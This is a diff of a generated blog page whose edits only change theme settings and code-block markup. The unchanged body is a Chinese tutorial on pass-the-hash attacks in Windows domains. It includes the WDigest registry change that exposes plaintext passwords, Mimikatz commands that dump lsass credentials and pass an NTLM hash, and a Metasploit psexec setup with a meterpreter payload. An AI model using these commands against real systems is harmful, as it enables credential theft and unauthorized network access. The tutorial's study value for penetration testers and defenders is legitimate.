@@ -56,7 +56,7 @@
 
   <script id="fluid-configs">
     var Fluid = window.Fluid || {};
-    var CONFIG = {"hostname":"fireline.fun","root":"/","version":"1.8.9","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":"https://hm.baidu.com/hm.js?613daf119ed9302ff8cc0e60daf78bfe","google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+    var CONFIG = {"hostname":"fireline.fun","root":"/","version":"1.8.9","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":true},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":true,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":"https://hm.baidu.com/hm.js?613daf119ed9302ff8cc0e60daf78bfe","google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
   </script>
   <script  src="/js/utils.js" ></script>
   <script  src="/js/color-schema.js" ></script>
@@ -278,7 +278,7 @@
 <h2 id="0x01-哈希传递攻击概念"><a href="#0x01-哈希传递攻击概念" class="headerlink" title="0x01 哈希传递攻击概念"></a>0x01 哈希传递攻击概念</h2><p>在域环境中，用户登录计算机时使用的大都是域账号，大量计算机在安装时会使用相同的本地管理员账号和密码，因此，如果计算机的本地管理员账号和密码也是相同的，攻击者就能使用哈希传递攻击的方法登陆内网中的其他计算机。</p>
 <p>在Windows系统中，通常会使用NTLM身份认证，NTLM认证不使用明文口令，而是使用口令加密后的hash值，hash值由系统API生成(例如LsaLogonUser)。攻击者获得有效的用户名和用户密码哈希值后，他们便能够使用该信息通过LM或NTLM身份验证向远程服务器或服务进行身份验证，而无需进行<strong>暴力破解</strong>散列以获取明文密码（此技术发布之前需要此密码）。该攻击利用了身份验证协议中的一种实现缺陷，即每次<strong>会话之间</strong>的密码散列保持静态，直到下次更改密码为止。</p>
 <p>从Windows Vista和Windows Server 2008开始，微软默认禁用LM hash。在Windows Server 2012 R2及之后版本的操作系统中，默认不会在内存中保存明文密码，Mimikatz 就读不到密码明文，只能读取哈希值。虽然此时可以通过修改注册表的方式抓取明文，但需要用户重新登录后才能成功抓取。修改注册表命令为：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apl">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest &#x2F;v UseLogonCredential &#x2F;t REG_DWORD &#x2F;d 1 &#x2F;f<br></code></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apl">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest &#x2F;v UseLogonCredential &#x2F;t REG_DWORD &#x2F;d 1 &#x2F;f<br></code></pre></div></td></tr></table></figure>
 
 <p>但是，这种方式要求系统重启或者用户重新登录，在实战中操作起来成功率还是比较低的。如果攻击者拥有用户密码的哈希值，则无需强行使用明文密码；他们可以简单地使用他们已经收获的任意用户帐户的哈希值来针对远程系统进行身份验证并模拟该用户。换句话说，从攻击者的角度来看，哈希在功能上等同于生成它们的原始密码。</p>
 <p>因此，攻击者如果使用工具将散列值传递到其他计算机中，进行权限验证，就能够在身份验证的时候模拟该用户(即跳过调用API生成hash的过程)，实现对计算机的控制。</p>
@@ -290,18 +290,18 @@
 <p>切换本地账户</p>
 <p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210214160257.png" srcset="/img/loading.gif" lazyload alt="image-20210214145957319"></p>
 <h3 id="Mimikatz-交互式获取"><a href="#Mimikatz-交互式获取" class="headerlink" title="Mimikatz 交互式获取"></a>Mimikatz 交互式获取</h3><p>读取lsass进程的信息，获取hash</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apl">privilege::debug<br>sekurlsa::logonPasswords<br></code></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apl">privilege::debug<br>sekurlsa::logonPasswords<br></code></pre></div></td></tr></table></figure>
 
 <p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210214160302.png" srcset="/img/loading.gif" lazyload alt="image-20210214152209729"></p>
 <p>获取终端</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apl">privilege::debug<br>sekurlsa::pth &#x2F;user:administrator &#x2F;domain:workgroup &#x2F;ntlm:4075bdc2e63781b034a034102356063a<br></code></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apl">privilege::debug<br>sekurlsa::pth &#x2F;user:administrator &#x2F;domain:workgroup &#x2F;ntlm:4075bdc2e63781b034a034102356063a<br></code></pre></div></td></tr></table></figure>
 
 <p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210214160306.png" srcset="/img/loading.gif" lazyload alt="image-20210214152128620"></p>
 <p>会弹出一个交互式的终端,这个终端以及伪造为我们指定的hash和用户，可以直接访问smb服务，我们可以通过copy文件，然后执行计划任务去拿到shell（使用atexec攻击）。</p>
 <p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210214160310.png" srcset="/img/loading.gif" lazyload alt="image-20210214152835360"></p>
 <h3 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h3><p>需要使用<code>exploit/windows/smb/psexec</code></p>
 <p>注意这里填入的哈希是<code>LM Hash:NTLM Hash</code>, 当系统默认不支持LM hash，LM hash可以设定为任意值。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apl">use exploit&#x2F;windows&#x2F;smb&#x2F;psexec<br>set payload windows&#x2F;meterpreter&#x2F;bind_tcp<br>set RHOST 172.16.27.10<br>set smbuser administrator<br>set SMBPass 00000000000000000000000000000000:4075bdc2e63781b034a034102356063a<br>run<br></code></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apl">use exploit&#x2F;windows&#x2F;smb&#x2F;psexec<br>set payload windows&#x2F;meterpreter&#x2F;bind_tcp<br>set RHOST 172.16.27.10<br>set smbuser administrator<br>set SMBPass 00000000000000000000000000000000:4075bdc2e63781b034a034102356063a<br>run<br></code></pre></div></td></tr></table></figure>
 
 <p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210214160316.png" srcset="/img/loading.gif" lazyload alt="image-20210214154108503"></p>
 <p>当然还有一些其它利用方法，比如：Cobalt Strike 抓取、powershell读取、 SAM表离线获取hash、wmiexec利用hash获取shell等等</p>
@@ -508,7 +508,7 @@
   <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
 
   <script>
-    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.configure({"showSpinner":true,"trickleSpeed":100})
     NProgress.start()
     window.addEventListener('load', function() {
       NProgress.done();
